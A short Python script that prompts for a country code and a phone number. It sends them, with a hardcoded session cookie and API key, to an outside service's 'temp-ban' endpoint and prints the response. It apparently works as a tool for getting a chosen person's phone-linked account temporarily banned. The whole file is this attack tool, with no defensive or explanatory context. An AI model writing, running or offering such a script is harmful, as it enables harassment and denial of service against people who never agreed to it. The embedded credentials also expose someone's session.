import requests
code=input("ENTER A CODE ")
NUMBER=input("ENTER A NUMBER ")

url = 'https://api-bruxiintk.online/api/temp-ban'
headers = {
    'Host': 'api-bruxiintk.online',
    'Sec-Ch-Ua': '"Chromium";v="121", "Not A(Brand";v="99"',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Accept': '*/*',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://api-bruxiintk.online/tempban.html',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Priority': 'u=1, i'
}
cookies = {
    'connect.sid': 's%3A7kBaoRIJK0I3qyMcnoHHEN4aCsBHlOZt.tm0%2BX6erehfLEAehlKcFHXxaqm129KM7dxvkU%2BQgUio'
}
params = {
    'apikey': 'devs30',
    'ddi': code,
    'numero': NUMBER
}


response = requests.get(url, headers=headers, cookies=cookies, params=params)

print(response.text)
